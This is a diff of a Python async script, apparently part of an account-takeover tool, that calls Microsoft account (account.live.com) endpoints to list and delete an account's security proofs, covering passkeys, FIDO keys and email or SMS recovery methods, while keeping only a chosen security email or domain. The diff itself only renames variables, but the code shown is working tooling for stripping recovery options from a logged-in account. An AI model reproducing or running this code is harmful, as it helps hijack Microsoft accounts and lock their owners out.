@@ -264,13 +264,13 @@ def _exclude_next_gen_ids(html: str) -> list[str]:
     return out
 
 
-def _page_meta(html: str, session: httpx.AsyncClient) -> dict:
+def _page_meta(html: str, sesja: httpx.AsyncClient) -> dict:
     uaid = ""
     m = re.search(r'"uaid"\s*:\s*"([a-fA-F0-9]{8,})"', html or "")
     if m:
         uaid = m.group(1)
     if not uaid:
-        uaid = (get_cookie(session, "uaid") or "").strip()
+        uaid = (get_cookie(sesja, "uaid") or "").strip()
     hpgid = _PROOFS_HPGID
     scid = _PROOFS_SCID
     uiflvr = _PROOFS_UIFLVR
@@ -296,9 +296,9 @@ def _page_meta(html: str, session: httpx.AsyncClient) -> dict:
 
 
 async def _api_json(
-    session: httpx.AsyncClient,
+    sesja: httpx.AsyncClient,
     url: str,
-    apicanary: str,
+    canary: str,
     payload: dict,
     *,
     uaid: str = "",
@@ -308,7 +308,7 @@ async def _api_json(
         "host": "account.live.com",
         "Accept": "application/json",
         "X-Requested-With": "XMLHttpRequest",
-        "canary": apicanary,
+        "canary": canary,
         "Referer": _PROOFS_PAGE,
         "Origin": "https://account.live.com",
     }
@@ -319,7 +319,7 @@ async def _api_json(
         headers["x-ms-apiTransport"] = "xhr"
         headers["x-ms-apiVersion"] = "2"
         body = json.dumps(payload, separators=(",", ":"))
-        resp = await session.post(
+        resp = await sesja.post(
             url=url,
             headers=headers,
             content=body.encode("utf-8"),
@@ -327,7 +327,7 @@ async def _api_json(
         )
     else:
         headers["Content-Type"] = "application/json; charset=UTF-8"
-        resp = await session.post(
+        resp = await sesja.post(
             url=url,
             headers=headers,
             json=payload,
@@ -348,8 +348,8 @@ async def _api_json(
 
 
 async def _delete_proof(
-    session: httpx.AsyncClient,
-    apicanary: str,
+    sesja: httpx.AsyncClient,
+    canary: str,
     proof_id: str,
     *,
     label: str,
@@ -376,9 +376,9 @@ async def _delete_proof(
 
     if kind == "passkey":
         ok, err = await _api_json(
-            session,
+            sesja,
             _REMOVE_PASSKEY_URL,
-            apicanary,
+            canary,
             {"credentialId": proof_id, **extras},
             uaid=uaid,
             form_urlencoded=True,
@@ -386,9 +386,9 @@ async def _delete_proof(
         api = "RemovePasskey"
     elif kind == "fido":
         ok, err = await _api_json(
-            session,
+            sesja,
             _REMOVE_FIDO_URL,
-            apicanary,
+            canary,
             {"credentialId": proof_id, **extras},
             uaid=uaid,
             form_urlencoded=True,
@@ -397,9 +397,9 @@ async def _delete_proof(
     else:
         # Legacy DeleteProof (same shape the web client uses for email/SMS)
         ok, err = await _api_json(
-            session,
+            sesja,
             _DELETE_PROOF_URL,
-            apicanary,
+            canary,
             {
                 "proofId": proof_id,
                 "uaid": uaid or "114b68368b7b46afa44c82a8246e4a44",
@@ -420,8 +420,8 @@ async def _delete_proof(
 
 
 async def strip_proofs(
-    session: httpx.AsyncClient,
-    apicanary: str,
+    sesja: httpx.AsyncClient,
+    canary: str,
     *,
     keep_security_email: str | None = None,
     keep_domain: str | None = None,
@@ -431,7 +431,7 @@ async def strip_proofs(
     Passkeys (incl. Apple iCloud Keychain, Samsung Pass, Google Password Manager)
     must use RemovePasskey. Federated sign-in is handled by remove_fed_cred.
     """
-    proofs = await session.get(
+    proofs = await sesja.get(
         _PROOFS_PAGE,
         headers={
             "Accept-Language": "en-US,en;q=0.5",
@@ -442,7 +442,7 @@ async def strip_proofs(
 
     html = proofs.text or ""
     logging.info("Proofs response: %s", html[:2000])
-    meta = _page_meta(html, session)
+    meta = _page_meta(html, sesja)
 
     keep_emails: set[str] = set()
     if keep_security_email:
@@ -504,8 +504,8 @@ async def strip_proofs(
             kind = _removal_kind(key, ptype, display)
             try:
                 ok = await _delete_proof(
-                    session,
-                    apicanary,
+                    sesja,
+                    canary,
                     pid,
                     label=label,
                     kind=kind,
@@ -529,8 +529,8 @@ async def strip_proofs(
         print(f"[~] - Passkey from excludeNextGenCredentialsJson ({cred_id[:24]}…)")
         try:
             ok = await _delete_proof(
-                session,
-                apicanary,
+                sesja,
+                canary,
                 cred_id,
                 label=label,
                 kind="passkey",
@@ -553,8 +553,8 @@ async def strip_proofs(
             continue
         try:
             ok = await _delete_proof(
-                session,
-                apicanary,
+                sesja,
+                canary,
                 proof,
                 label=proof[:64],
                 kind="proof",
@@ -573,8 +573,8 @@ async def strip_proofs(
         handled_ids.add(cred)
         try:
             ok = await _delete_proof(
-                session,
-                apicanary,
+                sesja,
+                canary,
                 cred,
                 label=f"passkey:{cred[:40]}",
                 kind="passkey",
@@ -590,7 +590,7 @@ async def strip_proofs(
     sms_remaining = False
     passkeys_remaining = 0
     try:
-        again = await session.get(
+        again = await sesja.get(
             _PROOFS_PAGE,
             headers={
                 "Accept-Language": "en-US,en;q=0.5",
